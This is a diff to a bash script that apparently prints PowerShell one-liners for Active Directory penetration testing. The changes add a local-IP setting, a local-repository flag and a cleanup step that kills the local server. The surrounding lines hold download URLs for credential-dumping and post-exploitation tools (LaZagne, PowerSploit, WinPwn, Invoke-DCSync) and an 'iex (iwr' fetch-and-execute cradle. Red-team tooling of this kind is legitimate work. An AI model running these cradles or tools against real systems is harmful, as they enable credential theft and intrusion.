@@ -8,7 +8,7 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-LocalIP="0.0.0.0";	#
+LocalIP="192.168.254.190";	#
 LocalPort="8085";		#
 
 Username="";			#
@@ -29,6 +29,8 @@ PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSy
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
+
+LocalRepo="False"
 
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
@@ -161,6 +163,7 @@ while [ $# -gt 0 ]; do
 		LazagneRepo="http://$LocalIP:$LocalPort/"
 		PowerSploitRepo="http://$LocalIP:$LocalPort/"
 		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
+		LocalRepo="True"
 		Function_LocalRepo;
                 shift
                 ;;
@@ -647,6 +650,44 @@ echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/BloodHound.p
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 
+################################################################################
+# Cleanup	                                                               #
+################################################################################
+
+echo -e ""
+echo -e ""
+echo -e ""
+
+if [ $LocalRepo == "True" ]
+then
+	echo -e "					${LYELLOW}		---> Press "K" to terminate script and python server <---${RESTORE}"
+	echo -e ""
+	echo -e ""
+	echo -e ""
+	echo -e ""
+	echo -e ""
+	echo -e ""
+	read KillScript
+	
+	case $KillScript in
+		k)
+				fuser -k "$LocalPort/tcp" 2> /dev/null
+		echo -e "										Script Terminated"
+		;;
+		
+		K)
+				fuser -k "$LocalPort/tcp" 2> /dev/null
+		echo -e "										Script Terminated"
+		;;
+	esac
+fi
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e ""
 
 
 ################################################################################
